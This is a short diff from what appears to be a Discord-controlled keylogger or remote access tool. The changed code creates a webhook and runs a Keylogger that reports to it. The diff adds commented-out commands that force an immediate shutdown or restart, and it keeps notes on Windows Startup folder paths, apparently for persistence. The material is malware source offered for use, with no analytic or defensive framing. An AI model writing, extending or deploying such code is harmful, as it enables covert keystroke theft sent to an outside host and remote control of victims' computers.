@@ -450,6 +450,7 @@ async def on_message(message):
             await message.reply(f"Created webhook, using URL: {webhook.url}")
             Keylogger(webhook.url).run()
         except Exception as e:
+            print(e)
             await message.reply(f"Failed to create new webhook!")
             return
         
@@ -472,9 +473,15 @@ except:
     pass
 
 
+#subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+#subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 #C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 #C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 
 
 #C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
+
+
